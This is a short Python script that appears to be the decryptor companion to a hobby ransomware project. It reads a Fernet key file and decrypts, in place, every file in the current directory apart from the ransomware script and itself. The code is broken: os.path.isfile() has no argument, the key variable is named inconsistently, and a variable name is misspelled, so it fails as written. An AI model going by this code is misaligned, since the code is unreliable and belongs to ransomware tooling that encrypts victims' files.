import os
from cryptography.fernet import Fernet

file_list = []

for file in os.listdir():
    if file == "ransom.py" or file == "generatedkey.key" or file == "ransomDecrypted.py":
        continue
    if os.path.isfile():
        file_list.append(file)


with open("generatedkey.key","rb") as generated_key:
    secret_key = generated_key.read()

for file in file_list:
    with open(file,"rb") as the_file:
        contents = the_file.read()
    contents_decrypted = Fernet(key).decrypt(contens)
    with open(file,"wb") as the_file:
        the_file.write(contents_decrypted)


